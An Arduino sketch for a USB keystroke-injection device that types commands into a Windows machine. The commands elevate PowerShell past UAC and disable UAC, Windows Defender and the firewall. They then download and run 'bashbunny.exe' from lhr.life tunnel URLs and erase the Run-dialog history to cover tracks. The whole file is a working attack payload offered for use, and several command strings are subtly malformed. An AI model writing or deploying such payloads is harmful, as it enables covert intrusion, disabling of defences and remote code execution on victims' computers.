#if ARDUINO > 10605
#include <Keyboard.h>
#endif
// Init function
void setup() {
	// Beginning the stream
	Keyboard.begin();
	// Waiting 1000ms for delay
	delay(3000);
	// Deploy RUN with WINGUI
	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press(114);
	Keyboard.releaseAll();
	delay(1000);
	Keyboard.print("powershell /command Set/WinUserLanguageList /Force en/US");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Wait
	delay(3000);
	// Deploy RUN with WINGUI
	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press(114);
	Keyboard.releaseAll();
	delay(1000);
	Keyboard.print("powershell Start-Process powershell -Verb runAs");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// This delay lets slow/old computers execute the PowerShell properly
	delay(2000);
	// Execute as Admin Accept
	Keyboard.press(KEY_LEFT_ARROW);
	Keyboard.releaseAll();
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// This delay lets slow/old computers execute the PowerShell properly
	delay(2000);
	// Disable UAC
	Keyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\nMicrosoft\\nWindows\\nCurrentVersion\\nPolicies\\nSystem -Name ConsentPromptBehaviorAdmin -Value 0");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Disable Windows Defender
	Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	Keyboard.print("Set-MpPreference -SubmitSamplesConsent NeverSend");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	Keyboard.print("Set-MpPreference -MAPSReporting Disable");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Disable firewall
	Keyboard.print("Set-NetFirewallProfile -Enabled False");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Modify 127.0.0.1 with your IP Address and payload.exe with your payload name
	Keyboard.print("$down = New-Object System.Net.WebClient; $url = https://c7b09296f8609c.lhr.life https://8fe8adacc4ff2e.lhr.life; $file = bashbunny.exe; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Clean run command history
	Keyboard.print("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	// Back to Spanish Keyboard Layout
	Keyboard.print("powershell -command Set-WinUserLanguageList -Force es-ES");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	Keyboard.print("exit");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
}
void loop() {}
